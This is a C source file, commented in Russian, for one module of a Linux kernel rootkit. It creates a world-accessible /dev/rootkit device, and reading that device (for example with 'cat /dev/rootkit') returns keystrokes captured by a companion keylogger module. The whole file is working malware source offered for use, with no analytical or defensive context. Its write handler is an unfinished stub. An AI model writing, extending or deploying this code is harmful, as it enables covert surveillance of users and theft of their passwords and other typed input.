/*
 * Для взаимодействия с руткитом был создан модуль, который создаёт устройство /dev/rootkit
 *
 * Далее взаимодествовать с руткитом можно как с файлом.
 *
 * Например, что-бы прочитать логи кейлоггера можно сделать так:
 *
 * cat /dev/rootkit
 *
 * Также доступны все операции с файлами через юзермодное приложение...
 */

#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>

#define DEVICE_NAME "rootkit"

static int major;
static struct cdev cdev;
static struct class *class = NULL;

//Логи из модуля keylogger.c
extern char key_str[];

// Функция выдачи результатов кейлогера, при чтении
static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
{
	size_t count = 0;
	char *msg = key_str;
	if(*offset == 0)
	{
		while (msg[count] != 0)
		{
			put_user(msg[count], buffer++);
			count++;
			(*offset)++;
		}
		return count;
	} else
	{
		return 0;
	}
}

//TODO Реализовать функцию записи
static ssize_t device_write(struct file *filp, const char *buffer, size_t length, loff_t *offset) {
	return 0;
}

static void cleanup(int device_created)
{
	if (device_created)
	{
		device_destroy(class, major);
		cdev_del(&cdev);
	}
	if (class)
		class_destroy(class);
	if (major != -1)
		unregister_chrdev_region(major, 1);
}

static char *dev_devnode(struct device *dev, umode_t *mode)
{
	if (mode != NULL)
		*mode = 0666;
	return kasprintf(GFP_KERNEL, "%s", dev_name(dev));;
}

static struct file_operations fops =
{
		.read = device_read,
		.write = device_write
};

// Интерфейсные функции работы с фаловыми операциями руткита
int init_fops(void)
{
	int device_created = 0;

	if (alloc_chrdev_region(&major, 0, 1, DEVICE_NAME) < 0)
		goto error;

	if ((class = class_create(THIS_MODULE, DEVICE_NAME)) == NULL)
		goto error;

	class->devnode = dev_devnode;
	if (!device_create(class, NULL, major, NULL, DEVICE_NAME))
		goto error;

	device_created = 1;

	cdev_init(&cdev, &fops);
	if (cdev_add(&cdev, major, 1) == -1)
		goto error;

	return 0;

	error:
	printk(KERN_INFO "+++ File operation init error \n");
	cleanup(device_created);
	return -1;
}

void exit_fops(void)
{
	cleanup(1);
}
